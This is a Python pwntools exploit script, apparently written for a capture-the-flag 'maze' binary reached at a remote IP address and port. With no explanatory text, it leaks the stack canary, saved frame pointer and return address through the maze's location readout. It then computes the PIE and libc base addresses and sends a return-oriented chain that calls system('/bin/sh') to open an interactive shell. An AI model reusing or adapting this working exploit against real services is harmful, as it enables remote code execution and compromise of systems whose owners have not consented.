from pwn import *

def getMoves(src, dest):
	moves = 's\n'*(dest[0]-src[0]) + 'd\n'*(dest[1]-src[1])
	return moves

def baca():
	p.sendline('l')
	p.recvuntil('Location = ')
	a =  p.recvuntil(' (')
	b = p.recvuntil(')')
	p.recvline()
	resp = b[:1]
	#print repr(a+b)
	return resp

e = ELF('./maze')
offset_rip = 0x10c4
getIdx = lambda offset : [offset/25, offset % 25]
offset_RBP = 400
offset_canary = offset_RBP - 8

moves = 'a\ns\na\na\na\na\nw\na\na\na\ns\na\ns\ns\ns\ns\na\na\n'
src = [11,0]
distance = offset_canary
dest = getIdx(distance)
moves += getMoves(src,dest)
#p = process('./maze')
p = remote('203.34.118.250', 20008)
canary = ''
p.send(moves)

resp = baca()
#print repr(resp)
canary += resp
for i in range(7):
	p.sendline('d')
	resp = baca()
	# print repr(resp)
	canary += resp

EBP = ''

for i in range(8):
	p.sendline('d')
	resp = baca()
	# print repr(resp)
	EBP += resp

EBP = u64(EBP)

RIP = ''
for i in range(8):
	p.sendline('d')
	resp = baca()
	# print repr(resp)
	RIP += resp
RIP = u64(RIP)
base_pie = RIP - offset_rip

print 'canary =',repr(canary), 'EBP =',hex(EBP), 'RIP =',hex(RIP), 'base pie =', hex(base_pie)

pop_rdi = p64(0x0000000000001133+base_pie)
gotputs = p64(e.got['puts'] + base_pie)
puts = p64(e.symbols['puts'] + base_pie)
maze = p64(e.symbols['maze'] + base_pie)

p.sendline('g')
print 'pop_rdi =',hex(u64(pop_rdi)),'maze =',hex(u64(maze)), 'gotputs =',hex(u64(gotputs)), 'puts =', hex(u64(puts))
payload = 'yes'
payload += '\x00'*2
payload += canary + 'JUNKDEAD' + pop_rdi + gotputs + puts + maze
p.sendline(payload)
# print repr(payload), len(payload)

p.recvuntil('Choice: \n')
print repr(payload)
print p.recvuntil('(yes/no) ')
puts_libc = p.recvline()[:-1] + '\x00\x00'
print repr(puts_libc)
print hex(u64(puts_libc))

puts_libc = u64(puts_libc)

# libc.so.2.23
offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
offset_dup2 = 0x00000000000f7970
offset_read = 0x00000000000f7250
offset_write = 0x00000000000f72b0
offset_str_bin_sh = 0x18cd57
offset_puts = 0x000000000006f690


libc_base = puts_libc - offset_puts
libc_system = libc_base + offset_system
libc_str_bin_sh = libc_base + offset_str_bin_sh

payload = 'g\nyes\x00\x00' + canary + 'JUNKDEAD' + pop_rdi + p64(libc_str_bin_sh) + p64(libc_system)
p.sendline(payload)
p.interactive()

#print hex(puts_libc)

#puts_libc = p.recv()
#print puts_libc

# p.interactive()




